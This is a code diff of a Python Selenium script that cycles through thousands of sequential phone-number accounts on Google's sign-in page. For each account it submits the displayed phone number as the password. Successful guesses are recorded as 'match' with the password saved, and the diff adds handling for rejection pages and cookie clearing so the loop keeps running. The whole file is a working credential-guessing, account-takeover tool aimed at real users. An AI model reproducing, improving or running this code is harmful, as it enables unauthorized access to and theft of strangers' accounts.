@@ -66,14 +66,15 @@ def main(account_data, postinfo, packages_id, body_mail):
 
     for no in range(int(account_data['extra']), int(account_data['extra'])+5000):
         
-        # print('check: {0}'.format(no))
-        
-        
-        # print(b.current_url())
+       
 
         # rejeted
         # https://accounts.google.com/signin/v2/deniedsigninrejected
+        #https://accounts.google.com/v3/signin/rejected
+        #https://myaccount.google.com/?utm_source=OGB&tab=mk&utm_medium=app
         # login page
+        #india
+        
         loginurl = 'https://accounts.google.com/AccountChooser/signinchooser'
         # password page
         # https://accounts.google.com/signin/v2/challenge/pwd
@@ -90,39 +91,48 @@ def main(account_data, postinfo, packages_id, body_mail):
 
         if 'challenge/pwd' in b.current_url():
             
-            #<input type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Enter your password" name="Passwd" autocapitalize="off" dir="ltr" data-initial-dir="ltr" data-initial-value="">
-            password = b.visibil_element('xpath','//input[@name="Passwd"]',wait=120)
-            mailpass = b.visibil_element('xpath','//div[@data-profile-identifier]',wait=120)
-            mailpass = ''.join(e for e in mailpass.text if e.isalnum())
+            try:
+                password = b.visibil_element('xpath','//input[@name="Passwd"]',wait=120)
+                mailpass = b.visibil_element('xpath','//div[@data-profile-identifier]',wait=120)
+                trypass = mailpass.text
+                if trypass.startswith('0') and '+91' ==str(account_data['email']):
+                    trypass = trypass[1:]
+                    
+                mailpass = ''.join(e for e in trypass if e.isalnum())
 
-            # print(mailpass)
-            password.clear()
-            # if account_data['extra'][0:1]:
-                # password.send_keys(0)
-            password.send_keys(mailpass)
+                # print(mailpass)
+                password.clear()
+                password.send_keys(mailpass)
 
-            passwordNext = b.visibil_element(
-                'css', '[id="passwordNext"] button')
+                passwordNext = b.visibil_element(
+                    'css', '[id="passwordNext"] button')
 
-            
-            passwordNext.click()
-            time.sleep(1)
-            
-            if b.visibil_element('xpath','//*[@width="16px"][@height="16px"]',wait=10):
-                worker_acc.save_account(data=mailpass, soft_token=account_data['password'])
-                print('not match: {0}'.format(mailpass))
                 
-                b.get_url(loginurl)
-                continue
-            else:
-                print('match: {0}'.format(mailpass))
+                passwordNext.click()
+            
+                time.sleep(1)
+                
+                
+                if b.visibil_element('xpath','//*[@width="16px"][@height="16px"]',wait=10):
+                    worker_acc.save_account(data=mailpass, soft_token=account_data['password'])
+                    print('not match: {0}'.format(mailpass))
+                    
+                    b.get_url(loginurl)
+                    continue
+                else:
+                    print('match: {0}'.format(mailpass))
+                        
+                        
                     
                     
+                    worker_acc.save_account(data= "password: "+mailpass, soft_token=account_data['password'])
+                    worker_acc.update_account(data=str(no), id=account_data['id'])
+                    b.driver.delete_all_cookies()
+                    b.get_url(loginurl)
+                    continue
+            except:
                 
-                
-                worker_acc.save_account(data= "password: "+mailpass, soft_token=account_data['password'])
-                worker_acc.update_account(data=str(no), id=account_data['id'])
-                b.driver.delete_all_cookies()
+                print('passwordNext')
                 b.get_url(loginurl)
                 continue
                 
@@ -138,15 +148,16 @@ def main(account_data, postinfo, packages_id, body_mail):
                 continue
         except:
             pass
-            # print('except imgcapch')
-            # time.sleep(60)
-            # b.get_url(loginurl)
-            # continue
 
         if 'signinrejecte' in b.current_url():
 
             b.get_url(loginurl)
-        if 'myaccount' in b.current_url():
+        if 'signin/rejected' in b.current_url():
+            b.driver.delete_all_cookies()
+            
+
+            b.get_url(loginurl)
+        if 'myaccount.google' in b.current_url():
             b.driver.delete_all_cookies()
             
 
@@ -181,10 +192,11 @@ def main(account_data, postinfo, packages_id, body_mail):
                 b.get_url(loginurl)
                 continue
 
-        nextpage = b.visibil_element(
-            'css', '#identifierNext button', wait=1)
+        
         
         try:
+            nextpage = b.visibil_element(
+            'css', '#identifierNext button', wait=1)
             nextpage.click()
             b.driver.implicitly_wait(25)
         except:
